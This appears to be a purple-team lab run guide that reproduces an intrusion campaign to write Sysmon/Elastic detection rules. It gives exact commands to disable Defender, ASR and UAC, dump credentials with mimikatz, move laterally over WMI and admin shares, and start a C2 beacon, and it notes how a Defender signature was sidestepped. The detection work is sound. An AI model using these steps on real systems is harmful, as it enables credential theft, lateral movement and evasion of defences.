# Operator phase (S4–S9) — context, evidence, gaps, and exact run guide

Run: **RUN-20260930-01**. Machines: WS01 192.168.50.20 (duc.user; it.admin local admin after setup),
FS01 192.168.50.30 (it.admin local admin; WMI firewall open; C:\C0015 ACL Everyone:F),
C2 host 192.168.50.1 (beacon/C2-SIM v3.2, Elastic 100.77.46.126:9200), DC01.
Elastic = Sysmon only (Security not yet ingested).

## 1. Operator-phase context (S4–S9)

Original campaign: operator from runbook → discovery → credential test/refinement → **WMI (process call create) with an explicit credential → rundll32 → 143.dll** → session-2 (FS01) → collection. The lab reproduces the same order; detailed telemetry is in `../../docs/telemetry-comparison-c0015-vs-lab.md`.

## 2. Machine evidence and executed time windows (2026-10-01, Z)

| Time | Machine | Stage | Evidence (record id / source) |
|---|---|---|---|
| 02:04:53 | WS01 | S1 | E1 `mshta bootstrap.hta` r=338620 → `regsvr32 /s c0015-comparefor.jpg` r=338630 → `powershell c0015_beacon.ps1` (matching parent entity); markers b64-js-comparefor-dll |
| 02:05:08–46 | WS01 | S2–S4 | E1 beacon children (discovery batch of 8) + E3 ws01→:8080 + register phase3 `S1-799c8731a354c9ad` |
| 02:34:31–35 | WS01 | S5 | E1 `net view \\FS01` + `Get-SmbShare` (par=beacon) → Finance+IT; Get-SmbShare → ADMIN$/C$/IPC$ |
| 02:45:47–52 | WS01 | S7b | E1 `mimikatz.exe` pid=8096 (02:45:47, par=cmd/runas) + **E10 ProcessAccess lsass grant=0x1010** (02:45:52); E11 copy mimikatz → C:\Tools (sha 92804faa…) |
| 02:49:58–02:50:02 | FS01 | S8a | E11 3 files: `c0015_143_surrogate.dll`, `c0015_beacon.ps1`, `config-phase7.ini` → C:\C0015 (dir \\FS01\C$ confirms the copy) |
| 03:03:56–03:06:40 | FS01 | S8b(diag) | E1 `WmiPrvSE→cmd` pid 564 (whoami), 4520 (type), rundll32-alone pid 6940 (ReturnValue 0) |
| 03:04:11.793 | FS01 | S8b | **E7 ImageLoad `c0015_143_surrogate.dll` r=94752 — rundll32 pid=5872, sha `cbcd2a8b…` == ART-06-01** |
| 03:04:11.808/.816 | FS01 | S9 | E11 `c0015_143-executed.txt`; E1 beacon `powershell c0015_beacon.ps1` pid=6616 **parent entity ≡ rundll32 (E7) entity** |
| 03:04:13 | server | S9 | register `phase7-session2` `S1-0ec401bd7b91df2d` → **receipt ART-07-01-7b91df2d.json** |
| 03:04:15 | FS01 | S9 | E3 `192.168.50.30 → 192.168.50.1:8080` (pid 6616, repeating) |
| 03:11:36 | FS01 | S8b(loader) | E1 `WmiPrvSE→cmd→powershell s8b_loader.ps1` pid 964/2220 (WMI-side substitute) |
| 03:04:38 | server | — | C2-SIM stopped (log exhausted); restarted 2026-10-02 01:09:25 (new session) |

## 3. What was accomplished (verified)
- The **rundll32 → 143.dll → LabEntry → beacon → E3 → receipt** chain is verified intact (hash parity + entity chain).
- **WMI process creation (T1047)** verified (diag + loader, E1 parent WmiPrvSE).
- S7b **E10 lsass 0x1010 by mimikatz** verified + NTLM captured.
- C2-SIM v3.2: `/results` `/last` output, re-register (elevate handoff), infinite loop — the remote operator reads the output of every command.

## 4. GAPS — to be addressed going forward (rule impact)
| # | Gap | Rule impact | Future direction |
|---|---|---|---|
| G1 | **Security not ingested** (4624/4648/4672/5140/5145/4688) | No S4648/S4624/S4672 → auth-stage rules and the `LogonId` join are dead in ES | Add `.ds-logs-windows.security-*` data stream (ingest policy); join LogonId on S7/S8a |
| G2 | **`wmiprvse→rundll32` cannot be created** (rundll32 + ANY DLL over WMI = ReturnValue 9, session-0/window-station) | Rule `parent=wmiprvse & child=rundll32` will not fire | Behavior rule: E7 ImageLoad of an unsigned DLL + abnormal E3 C2 traffic, regardless of parent ∈ {wmiprvse, svchost, cmd, powershell} |
| G3 | S7b model binary: the lab runs `mimikatz.exe` (E1), the original runs in-process | Rules keyed on process name miss in-process execution | Rule keyed on **E10 target=lsass with the access mask containing 0x1010/0x1fffff from a NON-system source**, excluding 0x1000/0x101000 (wininit/csrss/MsMpEng/svchost ambient) |
| G4 | E3 `:8000` (download stage) not present in the window | Download rule lacks a baseline | Re-run entry + capture E3 :8000 in the window, re-baseline |
| G5 | Noise: 47k events/2.5h (ws01 E11 12.4k, E10 4.4k, DC01 E3 2.1k) | Count/threshold rules are noisy | Anchor rules to parent entity + timers, not raw counts |
| G6 | Beacon multi-register/dedup/re-register, infinite loop | Command counts inflate (same command across rounds) | Dedup by `process.entity_id`, bound per entity |
| G7 | S8b host loader replaces rundll32 (WMI side) | rundll32-side rule misses the WMI part | Cover both: E1 wmi-parent + E7; or rebuild WMI→rundll32 once an environment with an interactive logon exists (not feasible currently) |
| G8 | C2-SIM died 03:04:38 (no self-restart) | Session interrupted; evidence gap | launch_servers/guard: auto-restart + pid healthcheck |

## 4b. RERUN-V2 — DIAGNOSTIC RESULTS (2026-10-02, verified on Elastic) → G1/G2/G4/G7/G8 RESOLVED

| Gap | Status | Evidence / change |
|---|---|---|
| **G1** | ✅ **RESOLVED (a false gap in the verify script)** | Security events ARE ingested, but under dataset **`system.security`** (`.ds-logs-system.security-*`, 154k docs) rather than `windows.security` — the verify script and docs queried the wrong index. In the old run window 02:00–04:30Z 10-01: **4624=414, 4672=328, 4648=24, 4688=11, 4625=3**. `verify_run_evidence.py` section [9] fixed to system.security. (5140/5145 = 0 → the Detailed File Share audit policy was not enabled, not an ingest issue.) |
| **G2** | ✅ **SOLVED — real root cause = wmic comma parsing + Defender signature** | (1) `wmic process call create "<cmd>"` splits arguments by **commas**: `...143.dll,LabEntry` → CommandLine truncated → CreateProcess "path not found" = ReturnValue 9 (unrelated to window-station/session-0 — rundll32-alone returning 0 proved rundll32 runs in session-0). **Fix: space-form** `...143.dll LabEntry` → **ReturnValue 0** + rundll32 calls the correct export. (2) FS01 was snapshot-reverted → Defender RTM re-enabled → signature **`Trojan:Win32/RyukLocalspawn.A`** blocks `wmic ... rundll32` → "Access is denied" (it matches the Ryuk/Conti WMI-lateral pattern!). **Verified on Elastic 02:09:55Z: E1 `rundll32 pid=5220 parent=WmiPrvSE.exe cmd=...143.dll LabEntry` + E7 hash `cbcd2a8b…`==ART-06-01 + E11 marker + beacon-3 phase7-session2 + receipt ART-07-01** → the camp signature `wmiprvse→rundll32→143.dll` is reproduced intact. |
| **G4** | ✅ **Closed** | E3 `:8000` is now available (S8a tool fetch via `Invoke-WebRequest`): verify section [8] can now run; the rerun window will capture it. |
| **G7** | ✅ **RESOLVED (with G2)** | The WMI side is now real rundll32; `s8b_loader.ps1` remains as a fallback. |
| **G8** | ✅ **RESOLVED (commit e793d7e)** | `scripts/c2sim_guard.py` + `launch_servers.ps1`: auto-respawn + stderr capture (`c2sim.err.log`) + stop-flag; `-Stop` kills guard + child + http. |
| FS01 state | ⚠️ **snapshot was reverted** (RTM/ASR/exclusions lost) → re-preflight | `preflight_vmrun.ps1` + `defender_off.ps1` (run as SYSTEM via schtasks) re-applied: RTM off, ASR `d1e49aac` off, exclusions, WMI firewall (WS01 opened anew for the operator hop), EnableLUA=0 (WS01), Word Trust Center (VBAWarnings/AccessVBOM/ProtectedView off). |

**Rule-writing updates based on the v2 results:**
- S8b: rule `E1 parent=wmiprvse & child=rundll32 + E7 unsigned-DLL + E3 :8080` is **live again** (matches the camp); keep the behavior-rule fallback for loader hosts (old G7).
- S7b: E10 lsass rule (0x1010/0x1fffff, non-system) — the source can be either the wmiprvse→powershell→mimikatz chain or the elevated beacon.
- S7/S8a: the LogonId join is now feasible — use `winlog.logon.id` (4648.SubjectLogonId ↔ 4624.TargetLogonId / TargetLogonGuid).

## 5. End-to-end rerun guide (EXACT — verified version)
> The "standard" commands below have been proven to produce the expected evidence. Each item lists the machine and where to collect the evidence.

**P0 — Build/preflight (once per machine)**
- Kali: build `143.dll` + download mimikatz + `john` (hashcat lacks OpenCL).
- WS01+FS01+C2: disable Tamper Protection → `Set-MpPreference -AttackSurfaceReductionRules_Ids d1e49aac-8f56-4280-b9aa-9936ba642ffc -AttackSurfaceReductionRules_Actions Disabled`; `-DisableRealtimeMonitoring $true`; exclusions (pwsh/powershell/cmd/wmic/rundll32/mimikatz + C:\C0015,C:\stage,C:\Tools,C:\Users\Public\C0015,C:\ProgramData\C0015,E:\lab).
- WS01: `net localgroup Administrators C0015\it.admin /add`; `reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f` + **reboot**.
- FS01: `net localgroup Administrators C0015\it.admin /add`; **open the WMI firewall**: `Set-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)" -Enabled True`; `icacls C:\C0015 /grant Everyone:F /T`.
- C2: repo clean, Elastic ingesting.

**P1 — Entry + beacon-1 (S1–S3)**
1. [C2] `pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -RunId RUN-<id> -Action Pre` (servers UP, wait for LISTENER OK on both ports).
2. [WS01] `runas /user:C0015\it.admin "cmd /c ping -t 127.0.0.1"` (S0 seed, keep the window open) → stage (`stage_ws01.ps1 -Source C:\stage`) → open `test.docm` (Enable Content).
3. [C2] `-Action WaitSession` (get the `S1-…` token) → `-Action P1`.

**P2 — Operator (S4–S9)** (beacon-1 alive)
1. [C2] `-Action P2` (runbook discovery+share; read output with `-Action Results`). Evidence E1 per command 02:05–02:34 — WS01.
2. [C2→WS01] `-Action Run -Body 'net view \\FS01'` + `-Body 'powershell -NoProfile -Command Get-SmbShare'` (S5).
3. [WS01] elevate the beacon: `runas /user:C0015\it.admin "cmd /k powershell … c0015_beacon.ps1 -Config C:\Users\Public\C0015\config.ini"` (token self-adopts; queue retained).
4. [WS01] S7b: elevated console `C:\Tools\mimikatz.exe` → `privilege::debug` → `sekurlsa::logonpasswords` → NTLM; [Kali] `john --format=nt` (rockyou failed → plaintext provisioned). Evidence E10 ws01 02:45 — **E10 lsass 0x1010**.
5. [C2] S8a: `-Action Run -Body 'cmd /c copy /Y C:\stage\c0015_143_surrogate.dll \\FS01\C$\C0015\'` (+ beacon, config-phase7). Evidence **FS01 E11 02:49–50**.
6. [C2] S8b: WMI pivot — **use the console loader** (rundll32-DLL over WMI was blocked): create `C:\C0015\s8b_loader.ps1` (LoadLibrary + LabEntry of 143.dll) on FS01, then `wmic /node:FS01 process call create "cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -File C:\C0015\s8b_loader.ps1"` → ReturnValue 0. Evidence **FS01 E1 WmiPrvSE→cmd→powershell**.
   (Original-telemetry preference: rundll32 → 143.dll once an interactive FS01 console is available — E7 r=94752 as verified.)
7. [C2] `-Action WaitSession`/check receipt: `Get-ChildItem evidence\run-ledger` → **ART-07-01-<token>.json** (S9). Evidence **FS01 E3 →:8080** + E11 marker + receipt.

**Q — Verify + cleanup**
- Elastic: run `scripts/verify/verify_run_evidence.py` (env ES creds) → hash parity + entity chain; `run-window-evidence.md`.
- `git pull/commit` evidence; cleanup: close the runas beacon, `-Action Stop`, re-enable ASR/RTM/firewall, delete C:\C0015/artifacts.

## 6. Rule-writing pointers (with gaps)
- **B-A-S-E standard**: S8b rule = E7 unsigned-DLL ImageLoad + abnormal E3 C2 port (G2); S7b = E10 non-system lsass access (G3); S4 = E1 beacon children (anchor entity, G6); S7/S8a auth = only feasible once Security is ingested (G1).
- Each rule note carries its G# gap identifier for future refinement.
